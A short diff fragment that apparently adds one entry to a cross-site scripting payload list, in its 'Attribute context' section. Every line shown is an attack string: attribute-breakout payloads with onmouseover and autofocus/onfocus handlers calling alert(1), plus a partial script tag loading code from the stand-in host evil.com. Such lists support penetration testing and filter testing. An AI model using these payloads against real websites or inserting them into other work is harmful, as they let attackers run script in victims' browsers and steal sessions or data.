@@ -679,6 +679,7 @@ src=//evil.com></script>
 
 # Attribute context
 " onmouseover=alert(1) x="
+"onmouseover="alert(1)
 ' onmouseover=alert(1) x='
 " autofocus onfocus=alert(1) x="
 ' autofocus onfocus=alert(1) x='
